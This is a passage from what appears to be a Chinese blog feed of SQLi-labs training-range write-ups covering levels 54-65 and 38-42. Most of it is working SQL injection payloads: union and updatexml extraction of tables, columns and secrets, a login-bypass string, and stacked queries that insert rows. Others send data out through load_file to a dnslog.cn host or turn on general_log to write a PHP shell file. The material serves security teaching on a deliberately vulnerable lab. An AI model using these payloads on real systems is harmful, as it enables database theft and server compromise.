<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>字段数 2,3</p><p><strong>查询表名</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()) <span class="hljs-comment">--+</span></code></pre><p>表名为：<code>bplubnri6m</code>，这个表名可能是随机的 不同用户不一样</p><p><strong>查询列名</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;bplubnri6m&#x27;</span>) <span class="hljs-comment">--+</span></code></pre><p>查到列名如下：id,sessid,secret_0UH9,tryy</p><p><strong>查询字段值</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(secret_0UH9) <span class="hljs-keyword">from</span> bplubnri6m) <span class="hljs-comment">--+</span></code></pre><p>拿到 key 值为：Vbf3WpKCBvu8s4rnCTEeWcPa</p><p>总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。</p><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=($id)</code></td></tr></tbody></table><p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化，这里不再赘述。</p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：</p><pre><code class="hljs Php"><span class="hljs-variable">$unames</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Dumb&quot;</span>,<span class="hljs-string">&quot;Angelina&quot;</span>,<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;secure&quot;</span>,<span class="hljs-string">&quot;stupid&quot;</span>,<span class="hljs-string">&quot;superman&quot;</span>,<span class="hljs-string">&quot;batman&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin1&quot;</span>,<span class="hljs-string">&quot;admin2&quot;</span>,<span class="hljs-string">&quot;admin3&quot;</span>,<span class="hljs-string">&quot;dhakkan&quot;</span>,<span class="hljs-string">&quot;admin4&quot;</span>);<span class="hljs-variable">$pass</span> = (<span class="hljs-variable">$unames</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name : &#x27;</span>. <span class="hljs-variable">$unames</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password : &#x27;</span> .<span class="hljs-variable">$pass</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];</code></pre><p>因为这里输出只输出 <code>$unames</code> 和 <code>$pass</code> 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：</p><pre><code class="hljs php">print_r(mysql_error());</code></pre><p>所以这里就可以进行报错注入，下面直接丢 payload 吧：</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>k4xoowbia1<span class="hljs-string">&#x27;),0x7e),1)--+ </span><span class="hljs-string"></span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(secret_D5OR) <span class="hljs-keyword">from</span> k4xoowbia1),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span></code></pre><p>这里我注入的表名为：<code>k4xoowbia1</code>，列名为：<code>secret_D5OR</code></p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58</p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，对于盲注强烈建议使用脚本，人工太慢，在实战工程中还是靠 sqlmap 这种自动化注入神器或者自己写脚本了，手工注入的话岂不是得天荒地老。</p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(($id))</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.sqlsec.com/2020/05/sqlilabs.html">国光的SQLI labs 靶场精简学习记录</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>sqli lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI labs 靶场笔记之堆叠注入 38-53 关</title>
    <link href="/p/1f400290.html"/>
    <url>/p/1f400290.html</url>
    
    <content type="html"><![CDATA[<h1 id="堆叠注入-38-53-关"><a href="#堆叠注入-38-53-关" class="headerlink" title="堆叠注入 38-53 关"></a>堆叠注入 38-53 关</h1><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>MySQL 的命令行中，每一条语句以<code>;</code>结尾，这代表语句的结束，如果在注入过程中在<code>;</code>后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p><pre><code class="hljs sql">mysql&gt; select * from users where id = 1;select version();+<span class="hljs-comment">----+----------+----------+</span>| id | username | password |+<span class="hljs-comment">----+----------+----------+</span>|  1 | Dumb     | Dumb     |+<span class="hljs-comment">----+----------+----------+</span>1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)+<span class="hljs-comment">-----------+</span>| <span class="hljs-keyword">version</span>() |+<span class="hljs-comment">-----------+</span>| <span class="hljs-number">8.0</span><span class="hljs-number">.12</span>    |+<span class="hljs-comment">-----------+</span><span class="hljs-number">1</span> <span class="hljs-keyword">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ol><li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li><li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li></ol><p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p><h3 id="各个数据库堆叠查询实例"><a href="#各个数据库堆叠查询实例" class="headerlink" title="各个数据库堆叠查询实例"></a>各个数据库堆叠查询实例</h3><p><strong>MySQL</strong></p><pre><code class="hljs Sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>();</code></pre><p><strong>SQL Server</strong></p><pre><code class="hljs Mssql">select 1,2,3;select * from test;</code></pre><p><strong>Postgresql</strong></p><pre><code class="hljs Sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;</code></pre><p>注入天书里面说 Oracle 不支持堆叠查询。</p><h2 id="Less-38-堆叠注入"><a href="#Less-38-堆叠注入" class="headerlink" title="Less-38(堆叠注入)"></a>Less-38(堆叠注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>又到了源码简单分析的时间了，来看看堆叠注入的代码是如何实现的：</p><pre><code class="hljs Php"><span class="hljs-comment"># id 参数直接带入到 SQL 语句中</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>)):    输出查询信息<span class="hljs-keyword">else</span>:    print_r(mysqli_error(<span class="hljs-variable">$con1</span>));</code></pre><p>发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：</p><pre><code class="hljs Php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-variable">$sql</span>);</code></pre><p>变成了现在的：</p><pre><code class="hljs Php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))</code></pre><p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p><p>既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：</p><p><strong>添加字段值</strong></p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>);</code></pre><p>数据库中查看是否添加成功：</p><pre><code class="hljs sql">mysql&gt; select * from users where username=&#x27;hello&#x27;;+<span class="hljs-comment">----+----------+----------+</span>| id | username | password |+<span class="hljs-comment">----+----------+----------+</span>| 15 | hello    | world    |+<span class="hljs-comment">----+----------+----------+</span>1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来演示我认为比较实用的姿势。</p><h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>需要条件：</p><ol><li>MySQL 开启 load_file()</li><li>DNSLog 平台 （<a href="http://dnslog.cn/">dnslog</a>、<a href="http://ceye.io/">CEYE</a>）</li><li>Windows 平台</li></ol><p><code>load_file</code> 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><pre><code class="hljs bash">\\192.168.31.53\<span class="hljs-built_in">test</span>\</code></pre><p><code>CONCAT()</code> 函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用 UNC 路径。</p><p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p><p>下面使用 Windows 下的 sqli-labs 测试环境：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.952nzx.dnslog.cn\\abc&#x27;</span>))<span class="hljs-comment">--+</span></code></pre><p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/01.png" alt="Less-38_DNSLog 数据外带"></p><p>手动 Hex 解码即可</p><h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>需要条件：</p><ol><li>Web 的物理路径</li><li>MySQL 可以读写 Web 目录</li><li>Windows 成功率 高于 Linux</li></ol><p>首先查看当前的日志的相关配置：</p><pre><code class="hljs sql">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>| Variable_name    | Value                                                           |+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>| general_log      | OFF                                                             || general_log_file | D:\phpstudy_pro\Extensions\MySQL8.0.12\data\DESKTOP-7FQSJGU.log |+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>2 rows in <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> <span class="hljs-keyword">warning</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p><code>general_log</code>环境默认是没有开启的，这里尝试注入的时候手动开启：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php&#x27;</span>;<span class="hljs-comment">--+</span></code></pre><p>然后 MySQL 再查看日志配置是否被修改了：</p><pre><code class="hljs sql">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;+<span class="hljs-comment">------------------+-----------------------------------------------+</span>| Variable_name    | Value                                         |+<span class="hljs-comment">------------------+-----------------------------------------------+</span>| general_log      | ON                                            || general_log_file | D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php |+<span class="hljs-comment">------------------+-----------------------------------------------+</span>2 rows in <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> <span class="hljs-keyword">warning</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>这个尝试 getshell：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><p>日志里面就会记录<code>&lt;?php phpinfo();?&gt;</code>，浏览器访问查看：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/02.png" alt="Less-38_开启日志 Getshell"></p><p><code>shell.php</code>日志文件内容：</p><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\phpstudy_pro\COM\..\Extensions\MySQL<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>\\bin\mysqld.exe, Version: <span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span> (MySQL Community Server - GPL). started with:<span class="hljs-attribute">TCP</span> Port: <span class="hljs-number">3306</span>, Named Pipe: MySQL<span class="hljs-attribute">Time</span>                 Id Command    Argument<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">42</span>.<span class="hljs-number">153350</span>Z   <span class="hljs-number">10</span> Query-- &#x27; LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267004</span>Z   <span class="hljs-number">11</span> Connectroot@localhost <span class="hljs-literal">on</span> security using TCP/IP<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267240</span>Z   <span class="hljs-number">11</span> Init DBsecurity<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267398</span>Z   <span class="hljs-number">11</span> QuerySELECT * FROM users WHERE id=&#x27;<span class="hljs-number">1</span>&#x27;;<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267695</span>Z   <span class="hljs-number">11</span> Queryselect <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-38 相比没有啥区别，只是拼接方式不一样。</p><pre><code class="hljs sql">?id=1;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-39/shell.php&#x27;</span>;<span class="hljs-comment">--+</span>?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-38 相比只是拼接方式不一样。</p><pre><code class="hljs sql">?id=1&#x27;);<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-40/shell.php&#x27;</span>;<span class="hljs-comment">--+</span>?id=1&#x27;);<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><p>但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。</p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样，这里不再赘述。</p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><ul><li><code>index.php</code></li></ul><p>没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。</p><ul><li><code>forgot_password.php</code></li></ul><p>if you forgot your password,go to hack it</p><ul><li><code>acc-create.php</code></li></ul><p>if you need to create account,then hack your way in</p><ul><li><code>failed.php</code></li></ul><p>Bug off you silly dump hacker</p><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># username 被过滤 &#x27; &quot; \ password 没有被</span><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<span class="hljs-comment"># 堆叠查询</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<span class="hljs-keyword">if</span> 查询成功：    <span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<span class="hljs-keyword">else</span>:    print_r(mysqli_error(<span class="hljs-variable">$con1</span>));<span class="hljs-keyword">if</span> 登录成功:    setcookie(<span class="hljs-string">&quot;Auth&quot;</span>, <span class="hljs-number">1</span>, time()+<span class="hljs-number">3600</span>);    跳转到 logged-in.php</code></pre><ul><li><code>logged-in.php</code></li></ul><p>登录成功，提供修改密码的表单</p><pre><code class="hljs Html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mylogin&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;pass_change.php&quot;</span>&gt;</span></code></pre><ul><li><code>pass_change.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-keyword">if</span> 没有登录:    重定向到 index.php<span class="hljs-keyword">if</span> 提交了修改密码表单:    <span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];    <span class="hljs-variable">$curr_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);    <span class="hljs-variable">$pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$re_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);    <span class="hljs-keyword">if</span> <span class="hljs-variable">$pass</span>==<span class="hljs-variable">$re_pass</span>:        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;</code></pre><p>这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。</p><p>经典的<strong>万能密码</strong>绕过 <code>1&#39; or 1#</code>:</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-42/login.php</span> HTTP/1.1...login_user=admin&amp;login_password=1&#x27; or 1#&amp;mysubmit=Login</code></pre><p>因为登录成功后返回：</p><pre><code class="hljs Php"><span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];</code></pre><p>所以登录了 id 为 1 的 Dumb 用户：</p><p>尝试<strong>联合查询</strong>:</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-42/login.php</span> HTTP/1.1...login_user=admin&amp;login_password=13141&#x27; union select 1,(select group_concat(username,&quot;:&quot;,password,0x3c62723e) from users),3#&amp;mysubmit=Login</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/03.png" alt="Less-42"></p><p><strong>报错注入</strong>：</p><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(username,&#x27;:&#x27;,password) from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)#&amp;mysubmit=Login</code></pre><p><img 